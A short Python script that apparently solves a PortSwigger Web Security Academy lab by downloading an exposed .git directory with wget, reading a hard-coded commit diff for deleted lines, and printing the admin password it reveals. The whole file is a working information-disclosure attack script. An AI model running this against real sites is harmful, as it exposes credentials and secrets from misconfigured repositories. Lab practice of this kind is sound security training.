import requests
import shutil
import os
import git
import re

'''

Coded by Kamran Saifullah
https://linkedin.com/in/KamranSaifullah
https://twitter.com/deFr0ggy
https://github.com/deFr0ggy

'''

proxxy = {

    "http" : "https://127.0.0.1:8080",
    "https" : "https://127.0.0.1:8080"

}

URL = "https://0a120045048a5598825a0d5300cd00a4.web-security-academy.net/"
r = requests.get(URL, verify=True)
git_url = URL + ".git/"
DIR = "DUMP"

try:
    if r.status_code == 200:
        
        print(f"[+] URL is accessible: {URL}")
        print(f"[+] GIT Version Control: {git_url}")
        print(f"[+] Checking WGET")

        if shutil.which("wget") != "None":
            print("[-] WGET is installed")

            if os.path.exists("DUMP"):
                print("[+] DUMP Folder Exists")
                print("[+] Downloading .GIT to /DUMP")
                
                os.system("wget -r " + git_url + " -P" + " DUMP/")

                print("[+] Finding The Admin Password From Files - Resursively")

                repo = git.Repo("DUMP//0a120045048a5598825a0d5300cd00a4.web-security-academy.net/.git")

                commits = repo.iter_commits()

                print("[+] Checking Commits Details\n")

                for item in commits:

                    data = repo.git.diff("a8a5f955fdba7fe5985d0211fe54fb782b737d66"+"^")
                    
                    print("[+] Printing Deleted Lines\n")

                    for lines in data.splitlines():
                        if lines.startswith("-"):
                            print(lines)
                
                print("[-] Lab Completed: Use the credential to login into the porta and delete the Carlos user.")
            else:
                print("[+] DUMP Folder Does Not Exists - Creating It")
                os.makedirs("DUMP")

        else:
            print("[+] WGET is not installed")

    else:
        print("Something Went Wrong")

except:
    print("Something went wrong!")

